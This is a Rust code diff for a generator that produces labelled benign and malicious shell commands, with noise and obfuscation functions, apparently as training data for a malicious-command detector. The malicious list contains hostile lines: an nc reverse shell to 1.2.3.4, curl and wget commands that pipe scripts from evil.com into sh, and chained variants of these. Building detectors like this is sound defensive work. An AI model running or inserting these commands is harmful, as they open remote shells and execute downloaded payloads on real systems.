@@ -10,19 +10,75 @@ pub struct Command {
 
 /* ---------------- BENIGN + MALICIOUS ---------------- */
 
+
+fn add_noise(s: &str) -> String {
+    use rand::{Rng, thread_rng};
+    let mut rng = thread_rng();
+
+    let noise_chars = "!@#$%^&*1234567890";
+
+    let mut result = s.to_string();
+
+    // Append noise
+    if rng.gen_bool(0.5) {
+        let extra: String = (0..rng.gen_range(2..10))
+            .map(|_| {
+                noise_chars
+                    .chars()
+                    .nth(rng.gen_range(0..noise_chars.len()))
+                    .unwrap()
+            })
+            .collect();
+
+        result.push_str(&extra);
+    }
+
+    // Random repetition (increases entropy)
+    if rng.gen_bool(0.3) {
+        result = format!("{} {}", result, result);
+    }
+
+    result
+}
+
 fn generate_benign(n: usize) -> Vec<Command> {
     let base_cmds = vec![
-        "ls -la","cd /var/www","cat file.txt","echo hello",
-        "mkdir test","rm temp.txt","touch new.txt",
-        "pwd","whoami","df -h","top","ps aux",
-        "nano file.txt","vim file.txt"
-    ];
+        "ls -la",
+//        "cd /var/www",
+        "cat file.txt",
+        "echo hello world",
+        "grep error logs.txt",
+        "sort data.txt | uniq",
+        "cut -d ',' -f1 file.csv",
+//        "printf \"abc123!!\"",
+//        "echo $(date)",
+//        "awk '{print $1}' file.txt",
+//        "mkdir test",
+//        "rm temp.txt",
+//        "touch new.txt",
+//        "pwd",
+//        "whoami",
+//        "df -h",
+//        "top",
+//        "ps aux",
+        "curl http://example.com",
+        "wget http://example.com",
+        "nc localhost 1234",
+        "echo aGVsbG8= | base64 -d",
+        "powershell Get-Process",
+];
 
     let mut rng = rand::thread_rng();
 
     (0..n).map(|_| {
-        let cmd = base_cmds.choose(&mut rng).unwrap().to_string();
-        Command { text: cmd, label: 0 }
+        let base = base_cmds.choose(&mut rng).unwrap();
+
+        let text = add_noise(base);
+
+        Command {
+            text,
+            label: 0,
+        }
     }).collect()
 }
 
@@ -32,16 +88,39 @@ fn generate_malicious(n: usize) -> Vec<Command> {
         "nc -e /bin/sh 1.2.3.4 4444",
         "curl http://evil.com/shell.sh | sh",
         "wget http://evil.com/payload.sh -O- | sh",
-        "powershell -enc PAYLOAD"
+        "powershell -enc PAYLOAD",
+        "echo hello && curl http://evil.com",
+        "printf test && nc 1.2.3.4 4444",
+        "cat file.txt | base64 -d",
     ];
 
     let mut rng = rand::thread_rng();
 
     (0..n).map(|_| {
-        let cmd = base_cmds.choose(&mut rng).unwrap().to_string();
-        Command { text: cmd, label: 1 }
+        let base = base_cmds.choose(&mut rng).unwrap();
+
+        // slight randomness (important)
+        let text = if rng.gen_bool(0.3) {
+            add_noise(base)
+        } else {
+            base.to_string()
+        };
+
+        Command {
+            text,
+            label: 1,
+        }
     }).collect()
 }
+
+
+fn layered_obfuscation(s: &str) -> String {
+    let mut out = s.to_string();
+    out = concat_obfuscation(&out);
+    out = variable_obfuscation(&out);
+    out
+}
+
 
 /* ---------------- TRAIN OBFUSCATION ---------------- */
 
@@ -100,6 +179,7 @@ fn obfuscate_test(cmd: &str) -> String {
         concat_obfuscation,
         char_encode_obfuscation,
         variable_obfuscation,
+        layered_obfuscation,
     ];
 
     let method = methods.choose(&mut rng).unwrap();
